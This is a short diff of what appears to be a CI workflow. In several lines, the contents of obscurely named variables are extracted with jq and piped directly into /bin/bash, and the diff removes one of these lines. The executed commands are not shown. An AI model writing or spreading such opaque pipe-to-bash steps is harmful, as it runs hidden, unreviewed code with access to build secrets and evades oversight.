@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$uah2323" | jq -r .cg0472 | /bin/bash
           echo $ypl05 | jq -r .xn4 | /bin/bash
           echo $l49 | jq -r .zat50 | /bin/bash
-          echo $wytpl43821 | jq -r .rbg1 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
